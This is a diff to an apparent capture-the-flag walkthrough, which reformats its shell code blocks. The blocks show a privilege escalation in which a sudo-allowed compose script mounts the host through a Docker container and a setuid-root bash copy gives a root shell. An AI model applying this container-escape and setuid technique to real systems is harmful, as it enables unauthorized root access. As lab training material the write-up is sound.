@@ -43,37 +43,37 @@ CMD /bin/sh /opt/run.sh
 ```
 
 And finally for our script we'll run:
-```bash
-mount -o remount,rw /mnt
-cp /bin/bash /mnt/bash
-chown root:root /mnt/bash
-chmod 4777 /mnt/bash
+```shell
+$ mount -o remount,rw /mnt
+$ cp /bin/bash /mnt/bash
+$ chown root:root /mnt/bash
+$ chmod 4777 /mnt/bash
 ```
 
 Upload these all to a folder called `docker` in the home directory for `john`. It's easier to keep track of everything that way and we can just delete the folder to clean up once we're done so it's not spoilt for the next person. Once you're got everything ready it's time to run secure compose. 
-```bash
-sudo /opt/secure_compose.py docker-compose.yml
+```shell
+$ sudo /opt/secure_compose.py docker-compose.yml
 ```
 
 `ls` our directory and we should see a shiny new `bash` executable. Let's try running it now.
-```bash
-./bash -p
+```shell
+$ ./bash -p
 
 ./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found...
 ```
 
 Oh dear. It looks like the `cybermonday_api` image uses a different version of `glibc`. Not to worry, there is one place where we know that we have a working copy of `bash`; the host itself. Let's change our `run.sh` script slightly.
-```bash
-mount -o remount,rw /mnt
-chown root:root /mnt/bash
-chmod 4777 /mnt/bash
+```shell
+$ mount -o remount,rw /mnt
+$ chown root:root /mnt/bash
+$ chmod 4777 /mnt/bash
 ```
 
 Then we just copy `bash` into our `docker` directory, and run the `secure_compose` script again.
-```bash
-cp /bin/bash ~/docker
-sudo /opt/secure_compose.py docker-compose.yml
-./bash -p
+```shell
+$ cp /bin/bash ~/docker
+$ sudo /opt/secure_compose.py docker-compose.yml
+$ ./bash -p
 
 bash-5.1# whoami
 root
